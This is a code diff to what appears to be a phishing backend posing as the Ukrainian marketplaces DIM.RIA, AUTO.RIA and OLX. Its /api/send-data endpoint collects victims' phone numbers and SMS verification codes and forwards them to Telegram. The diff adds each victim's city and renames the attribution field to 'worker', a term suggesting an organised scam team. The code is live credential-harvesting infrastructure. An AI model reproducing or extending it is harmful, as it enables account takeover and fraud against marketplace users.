@@ -21,7 +21,6 @@ const LOGOS = {
     olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
 };
 
-// === НАЗВИ ПРОЕКТІВ ===
 const PROJECT_NAMES = {
     dimria: "DIM.RIA",
     autoria: "AUTO.RIA",
@@ -69,19 +68,19 @@ async function sendToTelegram(message) {
 }
 
 app.post('/api/send-data', async (req, res) => {
-    const { step, phone, code, referrer, project = 'dimria' } = req.body;
+    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
 
     const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
 
     let message = '';
 
     if (step === 'phone' && phone) {
-        message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Країна:* Україна`;
-        if (referrer) message += `\n*Реферал:* @${referrer}`;
+        message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
+        if (worker) message += `\n*Воркер:* @${worker}`;
     } 
     else if (step === 'code' && code) {
-        message = `*SMS КОД:* \`${code}\`\n*ПРОЕКТ:* ${projectName}`;
-        if (referrer) message += `\n*Реферал:* @${referrer}`;
+        message = `*SMS КОД:* \`${code}\`\n*ПРОЕКТ:* ${projectName}\n*Місто:* ${city}`;
+        if (worker) message += `\n*Воркер:* @${worker}`;
     } 
     else {
         return res.status(400).json({ success: false });
